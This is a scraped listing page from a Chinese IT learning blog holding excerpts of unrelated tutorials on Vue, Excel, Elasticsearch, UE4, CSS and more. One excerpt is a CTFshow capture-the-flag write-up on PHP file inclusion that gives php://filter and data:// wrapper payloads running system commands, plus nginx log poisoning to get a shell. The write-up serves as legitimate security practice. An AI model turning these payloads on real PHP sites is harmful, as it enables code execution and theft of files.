安装 npm install video.js 复制代码在main.js中引入 import Video from 'video.js' import 'video.js/dist/video-js.css' Vue.prototype.$video = Video // 在vue的原生里添加了Video这个标签，增强了vue的功能性 这里用Vue.prototype.$video = Video 的目的是 在vue的原生里添加了Video这个标签，增强了vue的功能性，有想了解的可以去看我之前的文章
复制代码使用 &lt;div class="demo1-video"&gt; &lt;Video id="myVideo" class="自定义" controls //确定播放器是否具有用户可以与之交互的控件。没有控件，启动视频播放的唯一方法是使用autoplay属性或通过Player API。 autoplay: "muted", //自动播放属性,muted:静音播放 preload="auto" //建议浏览器是否应在&lt;video&gt;加载元素后立即开始下载视频数据。 poster="../assets/img/E0531.jpg"&gt; //设置视频封面 &lt;source :src="这里后台传回来的视频链接地址" type="video/mp4" &gt; //视频地址 &lt;/Video&gt; video可以直接使用css来控制video的宽高
写在最后 想播放视频还有像vue-video-player，原生video等
想了解更多去官网
这是官网地址：https://videojs.com/getting-started
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9db798043e561e4b739fd6b7b67226a1/" rel="bookmark">
			CTFshow刷题日记-WEB-文件包含
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文件包含专题
web78 if(isset($_GET['file'])){ $file = $_GET['file']; include($file); }else{ highlight_file(__FILE__); } 依旧是代码审计类型
直接伪协议
?file=php://filter/convert.base64-encode/resource=flag.php ?file=data://text/plain,&lt;?php system("nl flag.php");?&gt; 使用data协议和php://filter协议的各种格式 web79 加了过滤
$file = str_replace("php", "???", $file); payload
?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCJubCBmbGFnLnBocCIpOyA/Pg== base64中不要出现+，因为url编码中这是空格 web80 把data给过滤了
if(isset($_GET['file'])){ $file = $_GET['file']; $file = str_replace("php", "???", $file); $file = str_replace("data", "???", $file); include($file); }+654 ,N 包含日志文件 进行getshell 日志文件路径： ?file=/var/log/nginx/access.log
ctrl + u查看源码
不行的话多尝试几次
web81 和80题一样
这次用burp做
cat flag
再不同的界面多尝试几次
web82-86 利用session对话进行文件包含利用参考链接
#poc.php &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;body&gt; &lt;form action="ip地址" method="
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9db798043e561e4b739fd6b7b67226a1/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4bd5a8b788f2e9e58294f9371a3cf365/" rel="bookmark">
			currentIndex
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		&lt;ul&gt;
&lt;li v-for="(item,index) in movies" @click="changeColor(index)"
:class="{active:currentIndex===index}"&gt;
{{item}}---{{index}}
&lt;/li&gt;
&lt;/ul&gt;
el:'#app',
data:{
movies: ['七龙珠', '柯南', '你是我的荣耀'],
currentIndex: 0 ,
},
methods:{
changeColor(index){
this.currentIndex=index
}
}
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/808e34a5c2902582ca87e5b08b7d2de5/" rel="bookmark">
			excel如何设置下拉框选项
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		当我们需要在Excel中大量输入相同的多个数据时，可以设置下拉框选项，这能极大程度上减少我们的工作量。看看如何进行操作吧。
工具/原料 电脑
Excel表
方法/步骤 例如，我们完成如下的表格，在空白的地方输入要设置下拉框选项的文字“男、女”。然后选定需要设置下拉框选项的区域。
点击功能区内的“数据”--“数据有效性”。
在数据有效性的下拉边框内点击选择“设置”--“允许”下的“序列”。
然后在“来源”后面，点击选择数据来源选择的按钮。
如下图，拖动鼠标选定“男、女”，再次点击上面的数据来源按钮，返回设置对话框。
在设置对话框内点击“确定”按钮。当我们再次点击输入区域时就可以看到下拉框选项了。
END
经验内容仅供参考，如果您需解决具体问题(尤其法律、医学等领域)，建议您详细咨询相关领域专业
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/936b08b8607fb04ff0c7c7a0f5eb1890/" rel="bookmark">
			vue的hash模式下小程序内置组件web-view的缓存问题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		vue的hash模式下小程序内置组件web-view的缓存问题 前言：博客或者论坛上面，还有自习亲身经历，发现微信小程序的webview组件的页面缓存问题相当严重，对开发H5的小童鞋来说应该困扰了不少。很多小童鞋硬是抓破脑袋也没有办法解决这个问题，那我们今天就来探讨下这个问题。
使用实例：
&lt;web-view src="https://www.xxx.com"&gt;&lt;/web-view&gt; 上面实例就是微信小程序简单的web-view使用展示。
很多童鞋应该都会遇到这样一个问题，为什么我的h5页面已经更新到线上了，但是在微信小程序的web-view里面却展示的是上一个h5版本的内容，有些甚至会出现白屏的情况。
这个主要是基于我们现在前端大环境下，很多都是使用vue或者其他的单页面框架。就拿vue来说，vue默认打包下的路由的模式是hash模式，也就是url默认就带着#号的。所以很可能就会出现这样的情况是这样的
&lt;web-view src="https://www.xxx.com/#/"&gt;&lt;/web-view&gt; 这时候会有很多手机就会出现当h5的代码更新了v1.1的代码，但是他们的微信小程序的web-view里面展示的还是v1.0的，会很难受，然后就各种贴吧，论坛发文章寻求帮助。但是很多人都会回复说配置url版本号或者再url后面拼接时间戳标识，还有更离谱的会出现建议每次更新h5代码的时间修改项目的文件夹名称，想想是不是有点离谱了。但是按照他们的做法然后拼接版本号或者时间戳啥的，有些网友会回复缓存问题可以解决了啊，但是也有很多人会回复没有用啊。这时候开始疯狂抓狂了。
&lt;web-view src="https://www.xxx.com/#/?v=1.1"&gt;&lt;/web-view&gt; &lt;web-view src="https://www.xxx.com/#/a?v=1.1"&gt;&lt;/web-view&gt; &lt;web-view src="https://www.xxx.com/#/a/b?v=1.1"&gt;&lt;/web-view&gt; &lt;web-view src="https://www.xxx.com/#/a/b?a=b&amp;v=1.1"&gt;&lt;/web-view&gt; 有可能你们的路径会是上面这样子的了。版本号我也加了啊，为什么没有效呢？正常来说我们比如更新css文件或者js文件在url后面拼接上版本号去区分就可以解决的啊，为什么在这里会不生效啊。
答案：
因为vue的router默认的模式是"hash"，就是带#号的这种模式的，但是我们也可以删除#号的，在vue里面配置mode：“history”,也就是h5的histor模式，但是会有些童鞋会出现打包后出现白页面或者文件加载地址不对的问题，会出现各种坑，但是这些坑可能你都可以在论坛或者贴吧找到对应解决的办法的。普片都会说是需要配合nginx等服务器配置的。在这里我可以告诉你，其实可以不修改服务器配置去解决这个问题，vue本身打包的时候就可以解决这个问题的。这个问题在后面的文章里面我会仔细讲解，在这里我就先埋个伏笔好了，就不做过多的详细解释了。在这里我可以告诉你们，很多时候还是需要自己去尝试，自己在本地搭建一台nginx服务器去测试，项目的各种文件嵌套关系，对于打包有没有什么影响。
上面的web-view后面加的版本号是对于web-view的浏览器来说是他并不会重新加载页面的，就算变更了hash后面的版本号，他也只会增加一条历史记录，并不会重新加载页面，所以说，坑就坑在这个位置了，所以这时候我们只要把#号删除就可以解决为啥有些人加了版本号就会出现缓存，有些人不会出现这个问题了。
最后修改完的地址应该就是这样的
&lt;web-view src="https://www.xxx.com?v=1.1"&gt;&lt;/web-view&gt; &lt;web-view src="https://www.xxx.com/a?v=1.1"&gt;&lt;/web-view&gt; &lt;web-view src="https://www.xxx.com/a/b?v=1.1"&gt;&lt;/web-view&gt; &lt;web-view src="https://www.xxx.com/a/b?a=b&amp;v=1.1"&gt;&lt;/web-view&gt; 这样问题就可以轻松解决了。
其他的参考解决方案
针对url地址没刷新的问题，可以在webview组件的src里面添加一个时间戳. src = `https://XXX.com?timestamp=${new Date().getTime()}` &lt;web-view src='{{src}}'&gt;&lt;/web-view&gt; url后面加时间戳这个，苹果机是可以实时解决缓存的，然而安卓机不行
在index.html的head头部添加不缓存的配置 &lt;meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate" /&gt; &lt;meta http-equiv="Pragma" content="no-cache" /&gt; &lt;meta http-equiv="Expires" content="0" /&gt; 在webpack打包的时候加上 hash配置 filenameHashing: true, pages: { index: { // page 的入口 entry: 'src/main.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/936b08b8607fb04ff0c7c7a0f5eb1890/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/aa8800c0f96038540e7b19dd1ce86989/" rel="bookmark">
			java中^ 的运算
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		位异或运算（^）
运算规则是：两个数转为二进制，然后从高位开始比较，如果相同则为0，不相同则为1。
如
int a=10; int b=3; System.out.println(a^b) 结果：9 首先把a和b转换成二进制
十进制转二进制：十进制数除2取余法，即十进制数除2，余数为权位上的数，得到的商值继续除2，依次步骤继续向下运算直到商为0为止。
10转成二进制后为：1010
3转成二进制： 11
两者开始比较时，将位数补全
1010----&gt;00001010
11 ----&gt;00000011
两者比较，从最高位开始比较，
结果：00001001
所以比较时，只需按着两者中位数最高的开始比较，
结果：1001
然后再转成十进制（二进制转十进制：从后往前转,这里的 ^ 是次方的意思）：
1X2^0 + 0X2^1 +0X2^2 +1X2^3 =9
`
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4ed81aee3afc103943f18e844dc18815/" rel="bookmark">
			PhpSpreadSheet使用GD绘图将图片导出表格，图片不显示
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 1.检测是否安装gd库，若安装了gd库，还是没解决问题，继续往下看
2.在文件开始加上ob_clean()和header('content-type:image/*')即可
&lt;?php ob_clean(); header('content-type:image/*'); 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9c16ef75b28fa3e8f381adc4bd3e3a66/" rel="bookmark">
			linux设备树分析2-创建device_node树
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		二进制格式dtb设备树文件需要先转化成设备节点device_node结构，然后再将device_node转换成平台设备platform_device。
device_node在文件 include/linux/of.h中：
struct device_node { const char *name; /*保存节点名称属性*/ const char *type; /*节点类型*/ phandle phandle; /*节点句柄，该成员可以用于节点引用*/ const char *full_name; /*节点名称*/ struct fwnode_handle fwnode; /*暂时还不明白其作用*/ struct	property *properties; /*节点属性*/ struct	property *deadprops;	/*暂时还不明白其作用*/ struct	device_node *parent; /*父节点*/ struct	device_node *child; /*第一个子节点*/ struct	device_node *sibling; /*第一个兄弟节点*/ struct	kobject kobj; /*节点kobj对象*/ unsigned long _flags; /*节点标识*/ void	*data; /*节点特殊数据*/ #if defined(CONFIG_SPARC) /*暂不讨论*/ const char *path_component_name; unsigned int unique_id; struct of_irq_controller *irq_trans; #endif }; 从结构体parent，child，sibling三个成员可以看出device_node是以树状结构进行组织的。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9c16ef75b28fa3e8f381adc4bd3e3a66/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/57502a4924bc689613d36dd4e9b75a69/" rel="bookmark">
			阿里云elasticsearch实践（最大限度提高写入速度）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		ES学习文档 最权威的，当然就是官方文档，根据自己所安装的版本进行选择：elasticsearch所有版本参考文档如果英文文档阅读有困难，参考：Elasticsearch: 权威指南，但是中文文档有滞后性，比如目前es已经到6.X版本，而中文文档以2.X版本为基础，因此对于新版本的话会有部分不适用。参考博客：铭毅天下 使用阿里云 elasticsearch 使用阿里云 elasticsearch服务，就可以不用再自己安装elasticsearch，购买后即可立即使用，方便快捷。
如果使用java客户端进行访问会有限制：
具体请参考：阿里云elasticsearch介绍
elasticsearch插件 head插件
通过head插件连接es，可以从界面上进行可视化查看集群健康值、索引名称、类型名称，同时可进行基本查询以及es本身的DSL复杂查询
head插件可以直接使用360或者谷歌浏览器插件直接安装即可，不用再另外安装，下载地址：es head插件
X-PACK插件
可以提供身份验证，更好的保证数据安全。阿里云elasticsearch已经集成了X-PACK
IK分词插件
常用中文分词插件，阿里云elasticsearch已经有预置该插件，可以直接进行分词使用
阿里云elasticsearch实践 同步数据库数据到es包含两个过程，一个是从数据库中查出指定的数据，一个是将数据库查出来的数据保存到es中阿里云elasticsearch规格选用
cpu：4核
内存：16G
硬盘：256GB SSD（强烈建议使用固态硬盘，固态硬盘对于es的同步、更新效率有巨大的提升空间）
集群节点：3一般我们初始化数据到es的时候，数据量是非常大的，可能有几千万直至上亿，因此对于查询的sql一定要优化到非常快保存数据到es也是优化的重点，以下将列出所有优化步骤： 一定要用bulk批量提交
elasticsearch允许单次提交数据在15M以内，也不能过大，不然有可能会失败，因此我们可以批量查出多条数据（具体要多少数据才进行bulk条要看字段的多少，可以先保存部分数据到es验证下，目前总共占用多少容量，然后推算）。。千万不要用一条条提交，这个对于写入有巨大的提升！
禁用_all字段
_all字段是elasticsearch在保存的时候会自己生成一个字段，相当于将所有需要保存的数据全部冗余在这个字段里面，普通查询一般是用不到这个字段的，直接禁用掉：
http://localhost:9200/test_index/ { "settings": { "number_of_shards": 7 }, "mappings": { "testRequest": { "_all": { "enabled": false } } } } 注意：这里的number_of_shards这边设置为7（默认是5），那具体要怎么来确认到底需要创建多少分片数量呢？
请参考：es如何设置分片数量
提高硬盘的写入速率，前提是一定要固态硬盘！机械硬盘不能设置太高
http://localhost:9200/_cluster/settings/ { "persistent": { "indices.store.throttle.max_bytes_per_sec": "200mb" } } 注意：persistent，表示是永久设置，将会写入到elasticsearch配置文件中
关闭段合并merge
http://localhost:9200/_cluster/settings/ { "transient": { "indices.store.throttle.type": "none" } } 注意：transient，表示是临时设置，一旦elasticsearch重启，这个配置会立即失效。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/57502a4924bc689613d36dd4e9b75a69/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9358bbdb6226f02e6c7512bd7a85fa8d/" rel="bookmark">
			[浅析]UE4材质基础总结
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		图形学基础知识 除了自发光物体，成像皆由视网膜接收物体各尺度平面反射的光线构成
光照效果一般可分为漫反射和镜面反射（高光）两部分
漫反射：凹凸不平的表面反射的没有方向性的光
镜面反射：若反射面比较光滑，当平行入射的光线射到这个反射面时，仍会平行地向一个方向反射出来
光源照射物体时，将会与物体产生多种交互现象，反馈大致为：
光源到达物体表面时、物体原子会将光子部分吸收partially absorbed，能量守恒转化为热能，反射的部分较弱；且根据折射率具有不同角度微平面散射scattered，
穿透的部分将会产生折射Refraction、次表面散射Subsurface Scattering、半透明透射Transmission，
经过散射、微平面镜面反射的部分，称为 漫反射Diffuse，
被相对镜面反射，称为 镜面反射Specular
材质和材质实例概念 材质实例由材质继承而来，对父材质外观的参数化
游戏里只有父体材质会被编译，材质实例可降低渲染开销，在场景中高速渲染和实时反馈
材质资产为绿色，实例深绿色
材质中右键节点转换参数后创建实例，实例中产生配置参数，勾选后可设置
层级可以查看继承层级关系，可以直接定位到材质查看图表和细节面板，实例只有参数可配
动态材质实例概念 参数化的材质 + 蓝图 = 动态材质实例
作用：在游戏运行中动态改变材质，如角色走进某个范围后某个物体切换随机颜色，或自发光等效果
蓝图继承自Actor，构造脚本中create dynamic material，并保存动态材质的变量引用
事件图表
set vector parameter value： 按材质的参数名设置值
材质细节面板关键参数 物理材质
关联的物理材质，如碰撞产生的弹力将保留多少能力，不影响外观
应用：不同材质类型，不同反馈的实现
如：角色踩在不同材质上发出不同音效（射线检测 + 物理材质）
又如：子弹击中不同材质产生不同特效和音效（hitEvent + 物理材质）
材质域
材质的作用类型：会影响节点基础参数
表面材质域时，可设置用途Usage, 标记可控制材质应用对象的类型，引擎为每个应用程序编译特殊版本
如结合骨架网格体使用，结合粒子spirate使用等
混合模式
不透明（最常用）
遮罩Mask（部分固体可见部分不可见，如铁丝网围栏等）
细节面板参数：不透明蒙版剪切值
半透明（如玻璃类材质等）
纹理
即：材质贴图
着色模型
默认光照，大部分实心物体
次表面，如冰
预整合皮肤，用于人类皮肤
双面植物，如树上的树叶
毛发，用于逼真的头发材质
布料，用于逼真的布料和绒毛
眼睛，用于人类眼睛
双面，用于植物（法线将被翻转到背面，同时计算正面和背面的光照）
from材质表达式，用于单一材质处理多个着色模型
[注] 混合模式和着色模型详见官方文档：图形和渲染 - 材质 - 材质属性 材质属性|虚幻引擎文档
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9358bbdb6226f02e6c7512bd7a85fa8d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/dc6706a867aea28ac01a382690d344cc/" rel="bookmark">
			超越阿里云，华为云服务器究竟有多厉害！
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前不久，阿里巴巴集团董事会主席马云，在云栖大会上宣布成立阿里巴巴新型研究性机构“达摩院”，并对外宣称计划在三年之内对新技术投资超过1000亿元人民币。笔者感慨马云爸爸财大气粗的同时，也不禁会想这笔1000亿元人民币的巨额投资，是否能超过一直以研发投入高而闻名的另一家高科技企业——华为。
笔者经过一番搜寻，找到了国内外企业最近12个月研发投入排行表。
华为以112亿美金（约743亿人民币）的研发投入强势进入八强。不难算出华为在最近12个月的研发投入大概是阿里巴巴“达摩院”计划每年投资的两倍多，足见华为对技术研发的高度重视，不得不让人钦佩这个站在中国乃至世界技术顶端的东方巨头。
今年九月的华为全联接大会上，华为承诺长期提供公有云服务公有云。华为轮值CEO郭平表示，华为已经从战略上加大了对公有云的支持力度，并承诺长期投入，与合作伙伴一起，打造智能社会五朵云之一。
尽管目前从市场体量来看，华为云是难以跟阿里云去比较的。但是，华为云是进步最快的云，尤其是在技术方面。
在2017年6月30日发布的博睿2017第三期云测评报告中，该测试的目的是为了让广大公有云用户更加了解国内主要云厂商的真实网络质量，以公开透明的评测数据为公有云用户决策提供重要参考依据。
博睿的测试指标体系：所有云平台基于相同硬件配置和同样的网络环境，从基础网络性能和传输性能两大维度进行测评。监测节点同时包含了IDC节点和LM节点，145个监测节点(52个IDC节点，93个LM节点)覆盖全国31个省市自治区直辖市(港澳台除外)。运营商则选取了当前网络流量占比最高的三大运营商联通、电信和移动。
综合测试前五名如下：
从表格中的测试结果可以看出，在强手如林的公有云厂商中，“华为云”凭借强大的网络能力，拔得头筹。虽然“阿里云”已经有了多年的公有云运营经验，但是从技术层面来看，尤其是软硬件协同方面，华为云有着绝对的优势。凭借30年的技术积累和运维经验，“华为云”的网络服务比“阿里云”做的好，确实是情理之中的事情。
依托华为强大的研发实力和科技背景，笔者对于“华为云”在未来的表现还是充满了期待，希望“华为云”能够快速成长，让国内的公有云市场从一家独大，变成百花齐放，给客户多云的选择。同时也期待未来全球五朵云中，能够有两到三家中国的厂商，引领世界科技的潮流。
【需要免费体验体验华为云的，欢迎交流！】
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7feaefcbeb252b7f7e990c2d94aff243/" rel="bookmark">
			CPU缓存一致性动态图
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		https://www.scss.tcd.ie/Jeremy.Jones/VivioJS/caches/MESI.htm
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3565d2dc9337885b71ba28267b8a3106/" rel="bookmark">
			样本均衡之OHEM
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		论文地址：Training Region-based Object Detectors with Online Hard Example Mining
OHEM 主要解决神经网络中困难负样本的问题。
困难负样本是神经网络难以区分的负样本。我们希望模型在训练的时候，负样本的confidence接近0，但是如果不加干涉，总会有一些负样本不那么接近0。难样本挖掘就是要找到这些样本，针对性地训练。
主要贡献： 1、不需要设置正负样本的比例来解决类别不均衡的问题。
2、数据集越大，性能越加明显。
主要原理 1、根据损失进行筛选，选出对分类和检测影响大的样本。
2、将ROI网络进行扩充为2个，一个只有前向传播，计算loss，另一个正常前向和反向传播，但是只以hard example作为输入。计算损失和梯度回传。
那么问题来了，如何选择正负样本，如何选择难样本？
1、正负样本选取：
ROI 与groud truth IOU 大于0.5 为正，ROI 与所有groud truth IOU 均小于0.5 为负。 这么选负样本应该会很多，可以提高IOU抑制负样本，比如选 0.6。
2、难样本：
选择ROI损失最大的样本，并使用NMS去重，设置IOU = 0.7,大于0.7的去除。
OHEM 作为一种设计思路，很容易嵌入到检测网络当中。下面以OHEM 嵌入到Faster-RCNN 为例子：
Faster RCNN 主要由：
主干卷积网络，ROI Pooling 网络，全连接网络和两个输出。
将OHEM 嵌入后如下：
（a）部分只计算loss，不进行方向传播，计算得出难例子样本。
（b）部分将难例样本作为输入，进行前向和反向传播，计算两个输出。
与排序取样本的区别 SSD 中难负样本挖掘：
按照置信度误差排序，选取较大误差的前k个作为训练负样本，同时保证正负样本的比例接近1：3。质量和数量的保证。
而OHEM是通过对hard samples进行训练，解决样本不平衡问题，同时提高了算法识别率
OHEM可以帮助2-stage检测算法提升训练效果，通过对ROI loss值进行排序从而筛选出loss值非常大的ROI，这便是所谓的“困难负例”。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/dc92205d26812258dd7ee99abf1efe9f/" rel="bookmark">
			web前端学习（八）浮动布局——清除浮动
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		清除浮动的方法 父子级清除浮动：
1.在子级元素后添加一个空元素，为其添加clear:both 弊端：增加了无意义的元素结构
2.给父级元素设置一个overflow:hidden 解决了第一种方法的弊端 【最推荐使用第二种】
3.使用伪元素::after清除 为需要清除浮动元素的伪对象中设置height:0，
#layout:after{
clear:both;
content:”";
visibility:hidden;
height:0;} （用伪类清除浮动时用after，并且加上content：""可以加内容也可以不加，但是一定要加上display： block；同时还要写clear：both；）
兄弟级清除浮动：
给当前元素（被浮动影响的元素）设置css属性clear,值可为left、right，both。作用分别为清除左浮动元素带来的影响，清除右浮动元素带来的影响，清除左右两侧浮动元素带来的影响。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b683c076da4dd0a0f7143339955b7755/" rel="bookmark">
			关于win10安装silverlight成功 之后还是提示要安装的解决方案__2021年9月
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		## 前言
目前百度上的解决方案都依依试过仍是不能解决，但在运维机器人这找到了问题的症结所在，如图：
故在安装成功之后仍提示要安装的页面后可直接按以下操作进行：
1.设置默认浏览器为IE，设置方法请自行百度；
2.重启浏览器，即可成功。
win10系统的默认浏览器是edge’，所以会导致后续有些问题： 浏览器的当前属性不允许创建excel表格 大家可自行百度“解决IE的Automation 服务器不能创建对象的问题”。
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/posts/page/168/">«</a>
	<span class="pagination__item pagination__item--current">169/279</span>
	<a class="pagination__item pagination__item--next btn" href="/posts/page/170/">»</a>
</div>

			</div>
			

		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 IT学习者博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<script src="https://itnewbiea.github.io/js/foot.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>